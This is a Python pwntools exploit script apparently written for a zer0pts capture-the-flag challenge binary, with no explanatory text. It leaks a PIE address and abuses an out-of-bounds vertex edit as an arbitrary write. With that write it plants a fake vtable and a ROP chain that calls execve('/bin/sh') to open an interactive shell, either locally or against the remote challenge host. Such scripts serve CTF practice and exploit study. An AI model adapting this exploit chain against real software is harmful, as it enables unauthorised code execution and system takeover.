#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn1.ctf.zer0pts.com"
PORT = 9002
PROCESS = "./chall"

def getval1(x):
	#x &= 0xffffffff

	if x >= 0x80000000:
		x -= 0x80000000

	return x

def getval(val):
	if val > 0x7fffffff:
		val -= 0x100000000

	return val


def new(name, size, verts, dorecv=True):
	r.sendline("1")
	r.sendlineafter(": ", name)
	r.sendlineafter(": ", str(size))
	
	for x,y in verts:
		x, y = getval(x), getval(y)

		r.sendlineafter("= ", "(%d,%d)" % (x,y))

	if dorecv:
		r.recvuntil("> ")

def show(name):
	r.sendline("2")
	r.sendlineafter(": ", name)
	r.recvuntil("> ")

def leakpie():
	r.sendline("2")
	r.sendlineafter(": ", "0")
	r.recvuntil("Dmain [")
	PIELEAK = int(r.recvuntil("]", drop=True), 16)
	r.recvuntil("> ")
	return PIELEAK
	
def rename(old, new, overwrite=None):
	r.sendline("3")
	r.sendlineafter(": ", old)
	r.sendlineafter(": ", new)

	if overwrite:
		r.sendlineafter("[y/N]: ", overwrite)
	
	r.recvuntil("> ")

def edit(name, idx, vert):
	r.sendline("4")
	r.sendlineafter(": ", name)
	r.sendlineafter(": ", str(idx))
	r.sendlineafter("= ", "(%d,%d)" % (vert[0], vert[1]))
	r.recvuntil("> ")

def write(name, addr, value):
	edit(name, addr/8, [getval(value & 0xffffffff), getval(value>>32)])

def exploit(r):
	r.recvuntil("> ")
	PIELEAK = leakpie()
	e.address = PIELEAK - 0xa1e5d

	log.info("PIE leak   : %s" % hex(PIELEAK))
	log.info("PIE        : %s" % hex(e.address))

	new("abc", 3, [[1,2],[2,3],[4,5]])
	rename("abc", "abc", "N")
	
	GOSTACK = e.address + 0x00000000000a3ae4

	RET = e.address + 0x00000000000dac08
	ADDRSP18 = e.address +0x00000000000a0b7f

	POPRDI = e.address + 0x000000000011f893
	POPRSI15 = e.address + 0x000000000011f891
	POPRDX = e.address + 0x0000000000107c56
	SYSCALL = e.address + 0x00000000000d1ab1
	POPRAX = e.address + 0x00000000000aa2cd

	# write fake vtable
	write("abc", e.address + 0x152b50, e.address + 0x152b50)
	write("abc", e.address + 0x152b50+0x18, ADDRSP18)	
	write("abc", e.address + 0x152b50+0x28, e.address + 0x00000000000a459a)
	
	# write vtable address
	write("abc", e.address + 0x14c070+0x18, e.address + 0x152b50)

	payload = p64(POPRDI)
	payload += p64(e.address + 0x152bd8)
	payload += p64(POPRSI15)
	payload += p64(0)
	payload += p64(0)
	payload += p64(POPRDX)
	payload += p64(0)
	payload += p64(POPRAX)
	payload += p64(59)
	payload += p64(SYSCALL)
	payload += "/bin/sh\x00"

	for i in range(0, len(payload), 8):
		write("abc", e.address + 0x152b50+0x38+i, u64(payload[i:i+8]))

	new("3", 3, [[0,1], [0,2], [0,3]], False)

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./chall")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./chall")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)